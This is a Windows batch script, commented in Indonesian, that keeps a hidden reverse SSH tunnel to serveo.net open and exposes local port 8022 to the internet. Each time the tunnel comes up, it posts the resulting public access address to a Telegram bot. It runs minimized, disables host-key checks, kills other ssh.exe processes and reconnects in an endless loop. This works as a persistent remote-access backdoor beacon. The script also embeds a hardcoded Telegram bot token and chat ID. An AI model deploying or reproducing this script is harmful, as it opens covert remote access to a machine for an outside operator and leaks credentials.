@echo off
setlocal enabledelayedexpansion

set "BOT_TOKEN=7450852198:AAEJrO8y3gqaWFECOW87VtOpOtx13_WwrXg"
set "CHAT_ID=8107240151"

:LOOP
REM Cek koneksi internet
ping -n 2 8.8.8.8 >nul
if %errorlevel%==0 (
    echo [+] Koneksi tersedia, jalankan Serveo

    taskkill /f /im ssh.exe >nul 2>&1

    start "" /min cmd /c "ssh -o StrictHostKeyChecking=no -R 0:localhost:8022 serveo.net > serveo_log.txt 2>&1"
    timeout /t 6 >nul

    set "HTTPS_URL="
    set "TCP_URL="

    for /f "delims=" %%a in ('findstr "https://*.serveo.net" serveo_log.txt') do (
        set "HTTPS_URL=%%a"
        goto CHECK_TCP
    )

:CHECK_TCP
    for /f "delims=" %%a in ('findstr "serveo.net:[0-9]" serveo_log.txt') do (
        set "TCP_URL=%%a"
        goto SEND_TELEGRAM
    )

:SEND_TELEGRAM
    if defined HTTPS_URL (
        echo [+] HTTPS URL ditemukan: !HTTPS_URL!
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=Serveo HTTPS aktif: !HTTPS_URL!"
    )

    if defined TCP_URL (
        echo [+] TCP Forward ditemukan: !TCP_URL!
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=Serveo TCP aktif: !TCP_URL! (forward ke localhost:8022)"
    )

    if not defined HTTPS_URL if not defined TCP_URL (
        echo [!] Tidak ada URL Serveo ditemukan.
    )

    echo [!] Menunggu Serveo mati...
    :WAIT_SSH
    timeout /t 10 >nul
    tasklist | findstr /i "ssh.exe" >nul
    if %errorlevel%==0 goto WAIT_SSH

    echo [!] Serveo disconnected, ulangi...
    timeout /t 2 >nul
    goto LOOP
) else (
    echo [!] Tidak ada koneksi internet. Coba lagi 10 detik...
    timeout /t 10 >nul
    goto LOOP
)
